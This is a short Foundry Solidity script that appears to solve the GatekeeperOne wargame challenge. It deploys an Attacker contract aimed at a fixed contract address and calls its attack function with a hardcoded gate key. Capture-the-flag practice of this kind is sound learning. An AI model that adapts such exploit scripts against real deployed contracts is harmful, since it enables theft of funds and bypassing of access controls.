// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import "forge-std/Script.sol";
import "../src/Attacker.sol";
import "../src/Contract.sol";
import "forge-std/console.sol";

contract AttackScript is Script {
    GatekeeperOne gatekeeper =
        GatekeeperOne(0xDd109e136b6aBD18dC18154F21B8241D7bE0da6d);
    Attacker attacker;

    function setUp() public {
        vm.startBroadcast();
        attacker = new Attacker(gatekeeper);
    }

    function run() public {
        
        bytes8 gatekey = 0x808000000000C2A9;

        attacker.attack(gatekey);
        vm.stopBroadcast();
    }
}
